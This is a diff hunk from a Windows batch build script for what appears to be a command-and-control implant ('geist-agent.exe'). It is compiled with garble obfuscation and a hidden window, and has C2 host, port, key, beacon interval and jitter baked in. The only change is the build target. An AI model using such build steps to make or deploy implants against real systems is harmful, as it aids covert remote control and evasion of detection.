@@ -54,7 +54,7 @@ if %ERRORLEVEL% NEQ 0 (
 echo [*] Building with garble obfuscation...
 
 REM Build with garble
-garble -literals -tiny build -ldflags "-H windowsgui -X main.listenerHost=%C2_HOST% -X main.listenerPort=%C2_PORT% -X main.listenerEndpoint=%C2_ENDPOINT% -X main.hmacKeyHex=%HMAC_KEY% -X main.reconnectIntervalStr=%BEACON_INTERVAL% -X main.jitterSecondsStr=%JITTER%" -o geist-agent.exe main.go
+garble -literals -tiny build -ldflags "-H windowsgui -X main.listenerHost=%C2_HOST% -X main.listenerPort=%C2_PORT% -X main.listenerEndpoint=%C2_ENDPOINT% -X main.hmacKeyHex=%HMAC_KEY% -X main.reconnectIntervalStr=%BEACON_INTERVAL% -X main.jitterSecondsStr=%JITTER%" -o geist-agent.exe .
 
 if %ERRORLEVEL% EQU 0 (
     echo.
